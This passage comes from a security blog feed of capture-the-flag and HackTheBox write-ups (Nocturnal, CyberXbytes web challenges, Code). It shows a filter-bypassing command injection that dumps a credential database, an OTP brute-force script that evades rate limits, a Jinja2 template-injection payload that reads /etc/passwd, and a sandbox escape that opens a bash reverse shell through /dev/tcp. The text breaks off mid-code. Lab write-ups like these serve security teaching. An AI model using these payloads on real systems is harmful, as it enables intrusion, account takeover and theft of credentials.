<code>nocturnal_database.db</code> file, revealing the password hashes. The thing is <code>nocturnal_database.db</code> is a sqlite3 database file, we need to use sqlite3 to dump it. We can’t just add sqlite3, it will not work. We can use bash here, the bash command should look like this:<br><code>bash -c &quot;sqlite3 ../nocturnal_database/nocturnal_database.db .dump&quot;</code><br>But spaces are blacklisted, how we gonna bypass this?</p><h1 id="III-Exploit"><a href="#III-Exploit" class="headerlink" title="III Exploit"></a>III Exploit</h1><h2 id="Escape-Characters"><a href="#Escape-Characters" class="headerlink" title="Escape Characters"></a>Escape Characters</h2><p>Using escape characters may help us here. Replacing the space <code>&quot; &quot;</code> with tab “<code>\t</code>“ could work. The final payload will be:<br><code>bash\t-c\t&quot;sqlite3\t../nocturnal_database/nocturnal_database.db\t.dump&quot;</code><br><em>adding CRLF (<code>\r\n</code>)at first to start in a newline on left will be smart move, But the above payload should work fine</em>.</p><p><strong>Note:</strong> If you gonna inject the payload through burp, u need to URL encoded first.<br><img src="/images/htb-m/nocturnal/Pasted%20image%2020250723165437.png"></p><p>And we successfully got the hashes, time to crack it. Using <a href="https://crackstation.net/">CrackStation</a> only <code>tobias</code> hash was crackable, which is fine.<br>Tried to access the SSH server with the creds i just got, and got the first flag.</p><p><img src="/images/htb-m/nocturnal/Pasted%20image%2020250723165809.png" alt="User Flag"></p><h1 id="IV-ROOT"><a href="#IV-ROOT" class="headerlink" title="IV ROOT"></a>IV ROOT</h1><p>It’s time for privilege escalation. The first thing i do is to use this command <code>sudo -l</code> to see what commands i have access to, noticed i have no access on sudo. So it’s <code>linpease.sh</code> time (<a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">PEASS-ng&#x2F;linPEAS</a>)<br>I opened my local server, downloaded the tool from the victim machine and run it</p><p><img src="/images/htb-m/nocturnal/Pasted%20image%2020250723170151.png"></p><p>While analyzing the results from <code>linpease.sh</code>, i noticed port <strong>8080</strong> was opened. Maybe another webserver is running?</p><p><img src="/images/htb-m/nocturnal/Pasted%20image%2020250723170532.png"></p><p>By establishing a tunnel through SSH to that port using this command:<br><code>ssh -L 4444:localhost:8080 tobias@nocturnal.htb</code>.<br>Then navigate to the localhost port 4000 on the browser, we see a login page</p><p><img src="/images/htb-m/nocturnal/Pasted%20image%2020250723170933.png"></p><p>Tried to use <code>tobias</code> creds but it didn’t work. So i went back to <code>linpease.sh</code> results. I didn’t find much, most of the interesting files were forbidden.</p><p>So what now? I went back to the login page again and start playing with it a little bit. Start using response manipulation, looking for leaked endpoints with no luck.</p><p>I start fuzzing on the username with the same <code>tobias</code> password and found out it was <strong>admin</strong> that worked for me as a username.</p><p><img src="/images/htb-m/nocturnal/Pasted%20image%2020250723171834.png"></p><p><strong>ISPconfig:</strong> is like a control panel for managing web hosting services on Linux servers.<br>For this type of stuff, you should look for the service version and see if there is any vulns related to it.<br>But how we can know the version? By navigating to the help tab, you can see the version</p><p><img src="/images/htb-m/nocturnal/Pasted%20image%2020250723172255.png"></p><p>Searching for vulns related to the version, found it’s vulnerable to <strong>CVE-2023-46818</strong>. A PHP code injection vulnerability in the <code>records</code> POST parameter on <code>/admin/language_edit.php</code> endpoint:<br>&#x3D;&#x3D;&gt; <a href="https://seclists.org/fulldisclosure/2023/Dec/2">ISPConfig PHP Code Injection Vulnerability</a>.<br>I also found a POC that i can use to get a reverse shell from this CVE:<br>&#x3D;&#x3D;&gt; <a href="https://github.com/ajdumanhug/CVE-2023-46818">CVE-2023-46818 Python3 Exploit for ISPConfigPHP Code Injection Vulnerability</a>.<br>I downloaded the POC, run it and we got the root flag.</p><p><img src="/images/htb-m/nocturnal/Pasted%20image%2020250723173009.png" alt="Root Flag"></p>]]></content>
    
    
    <categories>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>htb</tag>
      
      <tag>linux</tag>
      
      <tag>machines</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CyberXbytes Web challenges</title>
    <link href="/2025/08/10/cyberxbytes/"/>
    <url>/2025/08/10/cyberxbytes/</url>
    
    <content type="html"><![CDATA[<p><img src="https://pbs.twimg.com/profile_banners/1808879606231150601/1749393248/1500x500"></p><p>I was scrolling on X and saw a tweet about <a href="https://cyberxbytes.com/">CyberXbytes</a> being published and hosting some challenges, so i decided to take a look.</p><h1 id="Silent-Bypass"><a href="#Silent-Bypass" class="headerlink" title="Silent Bypass"></a>Silent Bypass</h1><div class="note note-primary">            <p>Bypass Me if U can (:</p>           </div><p>The first challenge was medium level and had 6 solvers (i was the seventh)<br><img src="/images/cyberx/Screenshot%202025-08-11%20204934.png"></p><p>I opened the challenge, and it was a login page…<br><img src="/images/cyberx/Screenshot%202025-08-08%20113232.png"></p><p>When i face login pages, i usually focus on three things:</p><ul><li>Default creds</li><li>Injections</li><li>Request manipulation</li></ul><p>But before that, i start fuzzing, JavaScript analysis in order to see if there are any other endpoints on the site or any leaking creds that can help me. After some time, i found three endpoints while fuzzing:</p><ul><li>admin &#x3D;&gt; probably has the flag</li><li>login &#x3D;&gt; our login page</li><li>otp &#x3D;&gt; maybe we need to enter otp after a successful login<br><img src="/images/cyberx/Screenshot%202025-08-08%20114332.png"></li></ul><p>Looks great, but how do we log in? I tried to look for the things that i mentioned above, but none of them worked. When you enter wrong credentials, there is an error saying: <strong>Invalid credentials</strong>.</p><p>I tried common usernames, hoping the error gonna change cause in some cases, you may know that the username indeed exists if the error changed, so we can use the username the caused the different error and brute force for the password. But unfortunately, the error didn’t change; it was a robust logging system.</p><p>After some time, i opened the devtools to look for JS files. There were no files, but i found this.</p><p><img src="/images/cyberx/Screenshot%202025-08-08%20115804.png" alt="Classic"></p><p>After using the above creds, we can log in now. Noticed you get redirected to <code>/otp</code> endpoint. The otp requires 4 digits, and the site was checking it on the front end. I tried to manipulate that and add more digits to see what happens.</p><p><img src="/images/cyberx/Screenshot%202025-08-08%20120139.png"></p><p>To do this, you need to intercept the request through Burp (or any proxy you use) and add more digits in the otp parameter to see if the backend accepts it or not.</p><p><img src="/images/cyberx/Screenshot%202025-08-08%20140959.png"></p><p>Noticed the request was refused by the backend too (<strong>invalid otp</strong>). Okay, noticed we got a flask session after the login. The server may not even checking the OTP, and you can totally bypass it. I tried to go directly to <code>/admin</code> endpoint after the login, thinking i could bypass the OTP without the need to provide it, but i was wrong.<br><img src="/images/cyberx/Screenshot%202025-08-08%20141819.png"></p><p>You probably get a special token after a successful otp request that you can use to enter the admin panel. The good thing is that the otp was just 4 digits, which is easy to brute force.<br>I made a wordlist with this script that i made to generate digits with the width as you need:</p><div class="code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_wordlist</span>(<span class="hljs-params">start, end, width</span>):        <span class="hljs-keyword">return</span> [<span class="hljs-built_in">str</span>(i).zfill(width) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start, end + <span class="hljs-number">1</span>)]<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():    <span class="hljs-keyword">try</span>: start = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;start number (e.g., 0): &quot;</span>)) end = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;end number (e.g., 1000): &quot;</span>)) width = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;width (e.g., 4 for 0001): &quot;</span>))                <span class="hljs-keyword">if</span> start &gt; end:            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error: Start number must be less than or equal to end number.&quot;</span>)            <span class="hljs-keyword">return</span>        <span class="hljs-keyword">if</span> width &lt; <span class="hljs-number">1</span>:            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error: Width must be positive.&quot;</span>)            <span class="hljs-keyword">return</span>             wordlist = generate_wordlist(start, end, width) filename = <span class="hljs-string">&quot;wordlist.txt&quot;</span>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:            <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> wordlist: f.write(item + <span class="hljs-string">&#x27;\n&#x27;</span>)        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Wordlist saved to <span class="hljs-subst">&#123;filename&#125;</span>&quot;</span>)        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;First few entries:&quot;</span>)        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>.join(wordlist[:<span class="hljs-number">5</span>]))  <span class="hljs-comment"># show first 5 for preview</span>            <span class="hljs-keyword">except</span> ValueError:        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error, enter valid integers.&quot;</span>)    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>: main()</code></pre></div><p>I intercept the otp request again, send it to the intruder, and start brute forcing using the wordlist i just made.</p><p><img src="/images/cyberx/Screenshot%202025-08-08%20142733.png"><br>I noticed that after 10 requests, you got a different response saying <strong>Too many attempts</strong>, indicating there is a rate limit in place, stopping us from brute forcing. </p><p>In this situation, you need first to know how is that rate limit works? Is it triggered after 10 false requests (which could be a problem, harder to bypass), or does it trigger because we just send the requests too fast? OR it may be just a filter in place but with no power (i don’t know how to name it xD) – sometimes developers add a rate limit to prevent brute forcing, but it doesn’t actually stop brute force attacks. You may see an error like <strong>Too many attempts</strong>, but if you ignore it, continued the brute force even with the error message appearing, and once you hit the right otp, you are in! –.</p><p>To know that we need to test it first. I start by sending the requests with <strong>.5 sec</strong> delay in between. You can do that by:</p><ol><li>Navigate to the <strong>Resource Pool</strong> tab in intruder</li><li>Start with 10 requests and <strong>500</strong> milliseconds</li></ol><p><img src="/images/cyberx/Screenshot%202025-08-08%20150808.png"></p><p>Start the attack and see what happens.</p><p><img src="/images/cyberx/Screenshot%202025-08-08%20151051.png"></p><p>Noticed we didn’t get the “too many” error anymore, we just get the invalid one. By waiting until the correct otp hits, you will get the admin token and successfully get the flag</p><p><img src="/images/cyberx/Screenshot%202025-08-07%20215745.png"><br><img src="/images/cyberx/Screenshot%202025-08-07%20220037.png" alt="Flag"><br>I also made a script that do the same thing:</p><div class="code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> sysTARGET_URL = <span class="hljs-string">&quot;http://185.185.82.29:10002/otp&quot;</span> SESSION_COOKIE = <span class="hljs-string">&quot;eyJvdHBfYXR0ZW1wdHMiOjAsIm90cF9sb2NrZWQiOmZhbHNlLCJ1c2VybmFtZSI6ImFkbWluIn0.aJXaEQ.TOPjMCZNHekejRSMo5edG8yoVY4&quot;</span>  WORDLIST_PATH = <span class="hljs-string">&quot;wordlist.txt&quot;</span>     session = requests.Session()session.cookies.<span class="hljs-built_in">set</span>(<span class="hljs-string">&quot;session&quot;</span>, SESSION_COOKIE)<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;target: <span class="hljs-subst">&#123;TARGET_URL&#125;</span>&quot;</span>)<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;wordlist: <span class="hljs-subst">&#123;WORDLIST_PATH&#125;</span>&quot;</span>)<span class="hljs-keyword">try</span>:    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(WORDLIST_PATH, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> wordlist_file: otps = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> wordlist_file <span class="hljs-keyword">if</span> line.strip()] total_otps = <span class="hljs-built_in">len</span>(otps)        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Loaded <span class="hljs-subst">&#123;total_otps&#125;</span>&quot;</span>)        <span class="hljs-keyword">if</span> total_otps == <span class="hljs-number">0</span>:            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Wordlist is empty.&quot;</span>) sys.exit(<span class="hljs-number">1</span>)        <span class="hljs-keyword">for</span> i, otp <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(otps):            <span class="hljs-keyword">try</span>:                 payload = &#123;<span class="hljs-string">&quot;otp&quot;</span>: otp&#125; response = session.post(TARGET_URL, data=payload)                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;OTP: <span class="hljs-subst">&#123;otp&#125;</span> | Status: <span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;CyberXbytes&quot;</span> <span class="hljs-keyword">in</span> response.text:                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] SUCCESS! Correct OTP found: <span class="hljs-subst">&#123;otp&#125;</span>&quot;</span>)                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] Full Response:\n<span class="hljs-subst">&#123;response.text&#125;</span>&quot;</span>) sys.exit(<span class="hljs-number">0</span>)                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Too many attempts&quot;</span> <span class="hljs-keyword">in</span> response.text:                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[!] Rate limit&quot;</span>) sys.exit(<span class="hljs-number">1</span>)            <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;failed for OTP <span class="hljs-subst">&#123;otp&#125;</span>: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>) time.sleep(<span class="hljs-number">0.5</span>)<span class="hljs-keyword">except</span> FileNotFoundError:    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n wordlist not found&quot;</span>) sys.exit(<span class="hljs-number">1</span>)<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nerror: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>) sys.exit(<span class="hljs-number">1</span>)</code></pre></div><p><img src="/images/cyberx/Screenshot%202025-08-07%20173719.png"></p><h1 id="Obfuscated-Echo"><a href="#Obfuscated-Echo" class="headerlink" title="Obfuscated Echo"></a>Obfuscated Echo</h1><p><img src="/images/cyberx/Screenshot%202025-08-11%20205459.png"></p><div class="note note-primary">            <p>In this challenge, your goal is to find a clever way to access the content of flag.txt using a specific exploit. The objective is to reveal the flag by leveraging template injection techniques. Can you figure out how to use the right command to get the flag? so can you cat flag.txt</p>           </div><div class="note note-danger">            <p>You will be surprised how i solve at the end!!</p>           </div><p>This one was medium. Let’s see how to solve it<br><img src="/images/cyberx/Screenshot%202025-08-08%20211001.png"></p><p>At the first of the challenge, you will face an empty page with a massage: <code>Hello noname............</code> Since the description says it’s a <strong>template injection attack</strong> which will ease on us, we just need to find the injectable parameter that we will use to implement the attack. You can start fuzzing for parameters here, but i added the <code>name</code> parameter directly, i just had the feeling it’s the right one.</p><p><img src="/images/cyberx/Screenshot%202025-08-08%20212152.png"></p><p>When it comes to SSTI, you have 3 phases:</p><ul><li>Detect</li><li>Identify</li><li>Exploit</li></ul><h2 id="Detect"><a href="#Detect" class="headerlink" title="Detect"></a>Detect</h2><p>First, we need to see if there is indeed an SSTI vulnerability or not. To detect that we have a bunch of formats to test, the most common ones are (<code>&#123;&#123; &#125;&#125;</code>, <code>&lt;% %&gt;</code>).<br>I started with the curly brackets format, since we know the site is running on Flask (a Python framework)<br><img src="/images/cyberx/Screenshot%202025-08-08%20214821.png"></p><p>So the template engine likely will be one of the Python templating libraries (django, jinja, ..etc).</p><p>I start with this simple payload <code>&#123;&#123;7*7&#125;&#125;</code> which is supposed to get rendered by the engine as <strong>49</strong> if the vulnerability really exists.</p><p><img src="/images/cyberx/Screenshot%202025-08-08%20215542.png"></p><p>Cool! We got our output, but we didn’t finish yet.</p><h2 id="Identify"><a href="#Identify" class="headerlink" title="Identify"></a>Identify</h2><p>We need to know what exactly the type of template engine we are dealing with, probably it’s <strong>Jinja2</strong> or <strong>Django</strong>. To make sure, we need to inject another payload, something like<br><code>&#123;&#123;7*'7'&#125;&#125;</code> which is related to <strong>jinja2</strong>.</p><p><img src="/images/cyberx/Screenshot%202025-08-09%20203642.png"></p><p>Suddenly, we got an error. This indicates the debugger was open. The important thing here is that we got the template engine, it’s <strong>jinja2</strong>, and we got a weird <em>SyntaxError</em> says unexpected char <code>&#39;&amp;&#39;</code>. Where does that character come from??<br>I didn’t even inject <code>&amp;</code> in my payload at all, maybe there is some sort of WAF that replaces my characters??!</p><p>There was nothing suspicious in my payload except the single quotes <code>&#39;</code>. So i tried to inject only the single quotes and see what happens.</p><p><img src="/images/cyberx/Screenshot%202025-08-09%20204745.png"></p><p>Yup, single quotes and double quotes too are being sanitized by a blind WAF that i couldn’t really see in the code provided by the debugger.<br>Things are actually getting tricky since single and double quotes are sanitized, cause we need them in our payload. We need to figure something out</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>One of the repos that i get my payloads reference from is : <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/#jinja2-debug-statement">swisskyrepo</a></p><p>To make my exploit, i usually try to find <strong>classes</strong> that can help me to read files in the system, but since the quotes are sanitized, the exploit may not work due to syntax errors problems. We need an alternative way to read files in the system. </p><p>One way to do that is to get access to the <code>__builtins__</code> attribute, and to access that, we need a global function.<br>jinja2 has a global function called <code>get_flashed_messages()</code> that we can use to access the <code>__globals__</code> then <code>__builtins__</code> which has functions like <code>open()</code> that can be used to read files.</p><p>The other thing we need to use is the <code>attr</code> filter, which lets you access an attribute of an object by its name.<br>For example:</p><ul><li><code>user.name</code> is the same as <code>user|attr(&#39;name&#39;)</code></li></ul><p>But as you can see, there are quotes at the name part above <code>&#39;name&#39;</code> which are gonna be filtered, that’s why we need to use <code>request.args</code> to reference these attributes as variables instead, to get rid of the quotes and access them via the request module.<br>For example:</p><ul><li><code>&#123;&#123;get_flashed_messages|attr(request.args.p1)&#125;&#125;&amp;p1=__globals__</code> &#x3D;&gt; <code>get_flashed_messages.__globals__</code></li></ul><p>By these techniques combined, we can make a full exploit.</p><p>Start by reading the <code>/etc/passwd</code> file by using this payload:<br><code>&#123;&#123;%20get_flashed_messages|attr(request.args.p1)|attr(request.args.p2)(request.args.p3)|attr(request.args.p2)(request.args.p4)(request.args.p5)|attr(request.args.p6)()%20&#125;&#125;&amp;p1=__globals__&amp;p2=__getitem__&amp;p3=__builtins__&amp;p4=open&amp;p5=/etc/passwd&amp;p6=read</code></p><p><img src="/images/cyberx/Screenshot%202025-08-11%20202910.png"></p><p>To get the flag, change the <code>/etc/passwd</code> part with <code>flag.txt</code></p><p>And we successfully got the flag.</p><p><img src="/images/cyberx/Screenshot%202025-08-10%20221121.png"></p><p>The funniest thing is, after all of that, i noticed there is a bug or a mislead at the challenge (i don’t know if it’s intended).<br>You can get the flag by just typing <code>flag.txt</code> in the name parameter, even if it’s followed by chunk characters</p><p><img src="/images/cyberx/Screenshot%202025-08-10%20221504.png" alt="Flag"></p><h1 id="HackTHEPASS"><a href="#HackTHEPASS" class="headerlink" title="HackTHEPASS?"></a>HackTHEPASS?</h1><p><img src="/images/cyberx/Screenshot%202025-08-11%20204752.png"></p><div class="note note-primary">            <p>Register an account on the application. Identify a flaw within the forgot password functionality and login as user “<a href="mailto:&#x68;&#x61;&#99;&#107;&#x2e;&#x43;&#x79;&#x62;&#x65;&#x72;&#88;&#x62;&#121;&#x74;&#x65;&#x73;&#64;&#x67;&#109;&#97;&#x69;&#108;&#46;&#x63;&#111;&#x6d;">hack.CyberXbytes@gmail.com</a>“. After successful login, you will see a flag displayed.</p>           </div><p>This one was Hard level, let’s take a look.</p><p><img src="/images/cyberx/Screenshot%202025-08-11%20210119.png"></p><p>A simple login page looks like the one that Facebook has. There are no JS files, so i started fuzzing to see if there are any other endpoints that we can access.<br>I used Intruder with <code>common.txt</code> wordlist.</p><p>The fuzzer gives me three endpoints.</p><ol><li>console</li><li>register</li><li>forget-password</li></ol><p>The console one looks interesting, revealing that the debugger may be left open. i accessed this endpoint.</p><p><img src="/images/cyberx/Screenshot%202025-08-11%20210352.png"></p><p>Yup, the debugger is left open.</p><p>I started creating an account to login. After  a successful login you will see this.</p><p><img src="/images/cyberx/Screenshot%202025-08-11%20211254.png"></p><p>We need access to <code>hack.CyberXbytes@gmail.com</code> in order to get the flag. Let’s navigate to the<code>/forget-password</code> endpoint, which we’re gonna use to reset the victim’s password.</p><p>I saw that the reset function works by providing your email, then you will receive a reset link with a token that you can use to reset your password.</p><p><img src="/images/cyberx/Screenshot%202025-08-11%20211925.png"></p><p>I added my email and received a link (Noticed you need to provide a real email since probably there is a real SMTP server running on the system)</p><p><img src="/images/cyberx/Screenshot%202025-08-11%20212301.png"></p><p>I noticed this token is 32 characters; it looks like an MD5 hash. We can make sure of that with sites like <a href="https://hashes.com/en/tools/hash_identifier">hashes.com</a>.<br>Here is the thing, what exactly gets hashed? What does the server use the hash on, and then use it as a reset token?</p><p>That’s actually kinda wild, it’s maybe the email? Maybe the email with a timestamp? Maybe the email with a secret and timestamp (which will be a real issue for us).<br>You will never know what really gets hashed, but don’t forget we have the debugger left open. We need to make some sort of error to trigger the debugger and see the code.</p><p>I intercepted the reset request and tried to play with the parameter, i deleted the whole parameter.</p><p><img src="/images/cyberx/Screenshot%202025-08-11%20213844.png"></p><p>Cool, we triggered an error, and we got what we want. I copied the response into the browser and found this code.</p><p><img src="/images/cyberx/Screenshot%202025-08-11%20214052.png"></p><p>The token was the MD5 hash of just the email, great. Now we need to MD5 the victim’s email and use the hash value as a token to reset  his password and take control over the account</p><p><img src="/images/cyberx/Screenshot%202025-08-11%20215217.png"></p><p><img src="/images/cyberx/Screenshot%202025-08-11%20215152.png"></p><p>And we got the flag</p><p><img src="/images/cyberx/Screenshot%202025-08-11%20215326.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Code Machine (Easy)</title>
    <link href="/2025/08/05/htb-m/code/"/>
    <url>/2025/08/05/htb-m/code/</url>
    
    <content type="html"><![CDATA[<p><img src="/images/htb-m/code/1.jpg"><br>Here I’m gonna walk through how I solved the <strong>Code</strong> machine. It’s a Linux machine, an easy one on HackTheBox.</p><h1 id="I-Reconnaissance"><a href="#I-Reconnaissance" class="headerlink" title="I Reconnaissance"></a>I Reconnaissance</h1><p>First, i started by grabbing the machine IP and pasting it on the browser, noticed it didn’t give me any response, not even a domain to add it in <code>/etc/hosts</code> file.</p><p><img src="/images/htb-m/code/3.png"></p><p>Then i decided to run a simple Nmap scan, to see what’s going on with the server:</p><p><img src="/images/htb-m/code/4.png"></p><p>Noticed there is an SSH server and upnp server is open on port 5000, by navigating to that port in the browser to see what it has. I realized it’s a simple code editor, an IDE like vscode that can be used to run code.</p><p><img src="/images/htb-m/code/2.png"></p><p>I start analyzing JavaScript files to search for sensitive data or endpoints. I found some, but they led to absolutely nothing. Then i started looking for vulns related to this version, found nothing. So i started to play a little bit with the code editor.</p><h1 id="II-Analyze"><a href="#II-Analyze" class="headerlink" title="II Analyze"></a>II Analyze</h1><p>Start with a simple code <code>print(os.name)</code>, realized that there were restricted words (os, sys, platform, import,….etc) that i don’t have access to, indicating some type of WAF exists in place.</p><p><img src="/images/htb-m/code/5.png"></p><p>We have nothing now, we need a way to execute arbitrary commands (since this is a common thing in HTB, get into the system and read the flag). One way to do that is to find <code>classes</code> that will help to execute commands on the server. To do this, we first need to know the classes that exist in the server or the Python environment. There are several ways to do that.</p><ul><li><strong>1</strong>: You can add an empty tuple <code>()</code> appending the <code>__class__</code> attribute to it following by the <code>__bases__</code> attribute that will return the inherits classes, adding <code>.__subclasses__()</code> method at the last thing that will return all the classes inherit from an object (since everything in python is an object).</li></ul><div class="code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-built_in">print</span>((()).__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__())</code></pre></div><ul><li><strong>2</strong>: OR you can do it with empty string (<code>&#39;&#39;</code>) instead of tuple (<code>()</code>):</li></ul><div class="code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__())</code></pre></div><ul><li><strong>3</strong>: OR use empty list if you want (<code>[]</code>).</li></ul><p>But the easiest way is to use the object reference itself (if it’s not restricted)</p><div class="code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">object</span>.__subclasses__())</code></pre></div><p><img src="/images/htb-m/code/6.png"></p><h1 id="III-Exploit"><a href="#III-Exploit" class="headerlink" title="III Exploit"></a>III Exploit</h1><p>As you can see, we have a bunch of classes; we only focus on ones with <strong>command execution</strong>. There are several ones (<code>socket.socket</code>, <code>os._wrap_close</code>, <code>subprocess.Popen</code>) that may help us to get a <strong>reverse shell</strong>. Let’s use <code>subprocess.Popen</code>. But the problem is that to use this class, we need to know its index. And to know its index, we don’t have a way other than brute forcing it.</p><p><img src="/images/htb-m/code/7.png"></p><p>By increasing the number from <strong>1</strong> until we find the intended class that we want. We’re gonna use that number as the intended index in our payload after.<br>You can brute force this easily with Burp Intruder, and you will successfully find the index.</p><h1 id="IV-Reverse-Shell"><a href="#IV-Reverse-Shell" class="headerlink" title="IV Reverse Shell"></a>IV Reverse Shell</h1><p>Now we can use <code>subprocess.Popen</code> to execute our reverse shell.</p><p>We first need to establish a listener: <code>nc -lvnp 9001</code>. Then run this code:</p><div class="code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">317</span>]([<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/&lt;your-ip&gt;/&lt;your-port&gt; 0&gt;&amp;1&quot;</span>]))</code></pre></div><p>We successfully got a reverse shell:<br><img src="/images/htb-m/code/8.png"></p><p>By executing the <code>ls</code> command to list the files in the dir, as you can see, we have the source code of our app: <code>app.py</code></p><p><img src="/images/htb-m/code/9.png"></p><p>It has the secret key for signing the Flask session. Probably, maybe we could use it to sign an arbitrary session later. I copied the code and pasted into my VS Code, and found that part of code:</p><div class="code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/register&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>: username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>] password = hashlib.md5(request.form[<span class="hljs-string">&#x27;password&#x27;</span>].encode()).hexdigest() existing_user = User.query.filter_by(username=username).first()        <span class="hljs-keyword">if</span> existing_user: flash(<span class="hljs-string">&#x27;User already exists. Please choose a different username.&#x27;</span>)        <span class="hljs-keyword">else</span>: new_user = User(username=username, password=password) db.session.add(new_user) db.session.commit() flash(<span class="hljs-string">&#x27;Registration successful! You can now log in.&#x27;</span>)            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))</code></pre></div><p>The passwords from the registration page got MD5 hashed in the database, which we may crack it.<br>Navigating further, you will find the first flag at the <code>/app-production</code> directory:</p><p><img src="/images/htb-m/code/10.png" alt="User Flag"></p><p>But where is the second flag? Maybe we need to find some creds that will help us get access on other user?</p><p>By navigating to the <code>/instacne</code> directory, I found a database file. We may find the creds here?<br><img src="/images/htb-m/code/11.png"></p><p>I found a password hash for a user called <strong>martin</strong>. After cracking the hash on <a href="https://crackstation.net/">CrackStation</a>.<br>We now have a username and password that we can use to log in as <strong>martin</strong>.</p><h1 id="V-Root"><a href="#V-Root" class="headerlink" title="V Root"></a>V Root</h1><p>By executing this command in the terminal, <code>ssh martin@10.10.11.62</code>.<br>Noticed you successfully logged in, but unfortunately, we don’t have access to the root directory.</p><p>By executing this command: <code>sudo -l</code> to see if i have access to sudo or not and what commands i can run, i found the following:<br><img src="/images/htb-m/code/12.png"></p><p>i have access to a <code>backy.sh</code> script. What is that script even doing? I cat the file to read it and found this code:</p><div class="code-wrapper"><pre><code class="hljs BASH"><span class="hljs-meta">#!/bin/bash</span><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$#</span> -ne 1 ]]; <span class="hljs-keyword">then</span>    /usr/bin/echo <span class="hljs-string">&quot;Usage: <span class="hljs-variable">$0</span> &lt;task.json&gt;&quot;</span>    <span class="hljs-built_in">exit</span> 1<span class="hljs-keyword">fi</span>json_file=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><span class="hljs-keyword">if</span> [[ ! -f <span class="hljs-string">&quot;<span class="hljs-variable">$json_file</span>&quot;</span> ]]; <span class="hljs-keyword">then</span>    /usr/bin/echo <span class="hljs-string">&quot;Error: File &#x27;<span class="hljs-variable">$json_file</span>&#x27; not found.&quot;</span>    <span class="hljs-built_in">exit</span> 1<span class="hljs-keyword">fi</span>allowed_paths=(<span class="hljs-string">&quot;/var/&quot;</span> <span 